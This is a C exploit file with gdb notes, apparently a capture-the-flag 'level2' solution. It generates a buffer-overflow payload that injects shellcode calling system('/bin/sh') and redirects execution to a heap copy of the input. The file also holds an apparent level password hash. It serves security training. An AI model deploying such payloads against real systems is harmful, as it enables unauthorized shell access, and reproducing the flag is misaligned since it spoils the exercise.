#include <unistd.h>

//gcc script.c && ./a.out > payload && scp -P 4242 payload level2@192.168.56.105:/tmp/payload2
//53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
//gdb ./level2
//b p
//r < /tmp/payload
//disas
//b *0x080484f2
//c
//info registers
//ebp = 0xbffff718, esp = 0xbffff6b0, buff[] = 0xbffff6cc (ebp - 0x4c)
//x/80x $esp
//b *0x080484fb
//c
//info registers
//eax = last write
//b *0x0804853d (we will try to smash to the result of strdup on the heap instead of inside our buffer on the stack)
//info registers
//eax = 0x804a008, esp = 0xbffff6b0, ebp = 0xbffff718, eip = 0x804853d
//x/80x $esp
//si
//info registers (error: we smashed ebp)
//eax = 0x804a008, esp = 0xbffff71c, ebp = 0x42424242, eip = 0x804853e
//si
//info registers
//eax = 0x804a008, esp = 0xbffff720, ebp = 0x42424242, eip = 0x804a008

//system: 0xb7e6b060, require pointer as param
//payload: system("/bin/sh") ... pad ... point to head of string in heap

int main() {
    //points to the start of our buffer in heap
    int address = 0x804a008; //if we tried to point to the stack itself, we don't pass the check
    write(1, (char[12]){0x68, 0x14, 0xa0, 0x04, 0x08, 0xb8, 0x60, 0xb0, 0xe6, 0xb7, 0xff, 0xd0}, 12); //see payload_asm.asm for details on how this was generated
    write(1, "/bin/sh", 8);
    for (int i = 0; i < 60; ++i)
        write(1, "B", 1); //padding
    write(1, &address, 4);
    write(1, "\n", 1); //write a newline to finish the input when using cat /tmp/payload -| ./level2
}